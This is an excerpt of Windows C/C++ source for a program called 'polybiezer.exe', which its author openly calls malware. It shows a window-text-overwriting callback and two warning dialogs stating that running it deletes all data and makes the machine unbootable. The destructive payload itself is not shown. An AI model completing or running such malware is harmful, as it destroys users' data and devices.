...
BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	...
	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)L"polybiezer.exe", SMTO_ABORTIFHUNG, 100, NULL);
	return true;
...
This software has full capacity to delete all of your data and everything will be gone.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"polybiezer.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
...
THE CREATOR (Program-creator-489) IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT? (Your Device will no longer be bootable after executing this malware)", L"polybiezer.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
